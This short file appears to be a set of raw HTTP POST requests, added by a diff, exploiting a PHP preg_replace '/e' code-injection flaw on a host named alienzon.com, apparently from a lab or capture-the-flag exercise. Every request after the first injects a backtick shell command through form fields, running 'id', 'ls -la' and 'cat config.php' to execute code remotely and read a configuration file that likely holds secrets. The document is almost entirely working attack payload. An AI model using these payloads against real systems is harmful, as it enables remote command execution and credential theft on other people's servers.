@@ -1,0 +1,16 @@
+POST /?type=fun HTTP/1.1
+Host: alienzon.com
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+who=/(Han)/e&yourname=strtoupper(\1)
+
+[ .. snip ..]
+who=/Luke Skywalker has returned/e&yourname=`id`
+
+[ .. snip ..]
+who=/Luke Skywalker has returned/e&yourname=`ls -la`
+
+[ .. snip ..]
+who=/Luke Skywalker has returned/e&yourname=`cat config.php`
